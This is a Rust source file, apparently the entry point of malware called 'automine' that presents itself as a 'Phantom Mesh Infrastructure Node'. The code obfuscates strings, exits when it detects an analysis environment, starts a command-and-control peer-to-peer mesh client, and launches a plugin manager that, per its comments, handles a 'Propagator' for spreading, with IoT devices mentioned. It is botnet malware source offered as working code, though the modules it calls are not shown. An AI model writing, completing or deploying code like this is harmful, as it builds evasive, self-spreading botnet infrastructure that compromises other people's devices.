mod config;
use obfstr::obfstr;
mod helpers;
mod p2p;
mod host;
mod security;
mod modules;
mod discovery;
use clap::Parser;

#[derive(Parser)]
#[command(name = "automine")]
#[command(about = "Phantom Mesh Infrastructure Node", long_about = None)]
#[command(version)]
struct Cli {}

#[tokio::main]
async fn main() {
    // 0. Anti-Analysis Check (Minimal for IoT, but good to have)
    if security::anti_analysis::is_analysis_environment() {
        return; 
    }

    // Install Rustls Crypto Provider (Ring)
    let _ = rustls::crypto::ring::default_provider().install_default();

    println!("* Phantom Mesh Node Started *");

    // 1. Start C2 / P2P Mesh Logic (The Core Function of Mesh Node)
    // Mesh Nodes are Infrastructure. They don't run Payloads.
    // They run the DHT, Relay traffic, and anchor the network.

    // 2. Start Plugin Manager (Handles Propagator etc.)
    tokio::spawn(async {
        modules::plugin_manager::run_plugin_manager().await;
    });
    
    if let Err(e) = p2p::c2::start_client().await {
        eprintln!("{}: {}", "Mesh Error", e);
    }
}
